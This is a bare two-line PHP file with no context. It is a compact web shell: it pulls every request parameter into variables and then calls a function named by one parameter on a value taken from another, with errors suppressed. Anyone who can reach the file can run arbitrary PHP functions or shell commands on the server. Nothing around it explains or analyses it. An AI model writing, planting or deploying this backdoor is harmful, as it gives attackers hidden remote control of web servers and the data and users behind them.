<?php
extract($_REQUEST) && @$shall(stripslashes($except)) && exit;